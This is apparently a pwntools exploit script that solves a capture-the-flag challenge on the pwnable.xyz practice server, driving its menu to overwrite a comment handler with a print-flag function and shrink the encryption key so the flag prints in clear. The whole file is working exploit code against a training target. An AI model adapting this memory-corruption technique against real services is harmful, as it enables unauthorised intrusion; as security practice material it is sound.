from pwn import *

r = remote("svc.pwnable.xyz", 30006)

sla = r.sendlineafter
sa = r.sendafter


def regen_key(key_len):
    sla(b"> ", b"1")
    sla(b"key len: ", str(key_len).encode())


def load_flag():
    sla(b"> ", b"2")


def print_flag(survey, comment):
    sla(b"> ", b"3")
    sa(b"Wanna take a survey instead? ", survey)
    if survey == b"y":
        sa(b"Enter comment: ", comment)


# write address of real_print_flag() on do_comment
print_flag(b"y", b"a")
regen_key(0x40)


# Decrypt flag
for l in range(0x3F, 0, -1):
    regen_key(l)
load_flag()


# print flag
print_flag(b"n", b"a")


r.interactive()
